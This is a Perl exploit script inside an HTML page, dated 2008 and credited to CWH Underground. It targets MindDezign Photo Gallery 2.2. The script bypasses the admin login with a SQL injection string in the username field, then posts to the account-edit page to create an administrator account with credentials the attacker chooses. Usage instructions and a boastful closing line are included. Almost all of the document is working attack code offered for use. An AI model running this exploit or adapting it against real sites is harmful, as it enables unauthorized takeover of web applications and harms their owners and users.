<html><head><title>MindDezign Photo Gallery 2.2 Arbitrary Add Admin Exploit</title></head><pre>#!/usr/bin/perl
#=============================================================
# MindDezign Photo 2.2 Gallery Arbitrary Add Admin Exploit
#=============================================================
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O	.. CWH Underground ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE   : 23 October 2008
#SITE   : cwh.citec.us
#
#
#####################################################
#APPLICATION : MindDezign Photo Gallery
#VERSION	 : 2.2
#DOWNLOAD    : http://gallery.minddezign.com/?module=download
#####################################################
#
#Note: magic_quotes_gpc = off
#
#This Exploit will Add user to Administrator's Privilege.
#
#######################################################################################
#Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#######################################################################################

use LWP;
use HTTP::Request;
use HTTP::Cookies;

print &quot;\n==================================================\n&quot;;
print &quot;    MindDezign Photo Arbitrary Add Admin Exploit \n&quot;;
print &quot; \n&quot;;
print &quot;         Discovered By CWH Underground \n&quot;;
print &quot;==================================================\n&quot;;
print &quot;                                              \n&quot;;
print &quot;  ,--^----------,--------,-----,-------^--,   \n&quot;;
print &quot;  | |||||||||   `--------'     |          O	\n&quot;;
print &quot;  `+---------------------------^----------|   \n&quot;;
print &quot;    `\_,-------, _________________________|   \n&quot;;
print &quot;      / XXXXXX /`|     /                      \n&quot;;
print &quot;     / XXXXXX /  `\   /                       \n&quot;;
print &quot;    / XXXXXX /\______(                        \n&quot;;
print &quot;   / XXXXXX /                                 \n&quot;;
print &quot;  / XXXXXX /   .. CWH Underground ..  \n&quot;;
print &quot; (________(                                   \n&quot;;
print &quot;  `------'                                    \n&quot;;
print &quot;                                              \n&quot;;

if ($#ARGV + 1 != 3)
{
   print &quot;Usage: ./xpl.pl &lt;Target URL&gt; &lt;user&gt; &lt;pass&gt;\n&quot;;
   print &quot;Ex. ./xpl.pl http://www.target.com/gallery/ cwhuser cwhpass\n&quot;;
   exit();
}

$blogurl = $ARGV[0];
$user = $ARGV[1];
$pass = $ARGV[2];

$loginurl = $blogurl.&quot;?module=admin&amp;action=login&amp;task=login&quot;;
$adduserurl = $blogurl.&quot;?module=admin&amp;action=account&amp;task=edit&quot;;
$post_content = &quot;username=&quot;.$user.&quot;&amp;password=&quot;.$pass.&quot;&amp;confirm_pass=&quot;.$pass.&quot;&amp;btn_submit=Submit&quot;;


print &quot;\n..::Login Page URL::..\n&quot;;
print &quot;$loginurl\n&quot;;
print &quot;\n..::Add User Page URL::..\n&quot;;
print &quot;$adduserurl\n\n&quot;;
print &quot;..::Login Process::..\n&quot;;

$ua = LWP::UserAgent-&gt;new;
$ua-&gt;cookie_jar(HTTP::Cookies-&gt;new);
$request = HTTP::Request-&gt;new (POST =&gt; $loginurl);
$request-&gt;header (Accept-Charset =&gt; 'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
$request-&gt;content_type ('application/x-www-form-urlencoded');
$request-&gt;content ('username=admin\'+or+\'a\'=\'&amp;password=a&amp;btn_submit=Submit'); 
$response = $ua-&gt;request($request);
$location = $response -&gt; header('Location');

print &quot;\n[+]Result :: &quot;;

if ($location =~ /gallery_item_list/)
{
   print &quot;Login Success!!!\n&quot;;
}
else
{
   print &quot;Login Failed!!!\n&quot;;
   exit();
}

print &quot;\n..::Add Admin Exploit::..\n&quot;;
$request = HTTP::Request-&gt;new (POST =&gt; $adduserurl);
$request-&gt;content_type ('application/x-www-form-urlencoded');
$request-&gt;content ($post_content);
$response = $ua-&gt;request($request);

   print &quot;\n[+]Result\n&quot;;
   print &quot;Username :: &quot;.$user.&quot;\n&quot;;
   print &quot;Password :: &quot;.$pass.&quot;\n&quot;;
   print &quot;Role     :: Administrator\n&quot;;
   print &quot;\nEnjoy with Bugs ;)&quot;

# milw0rm.com [2008-10-23]</pre></html>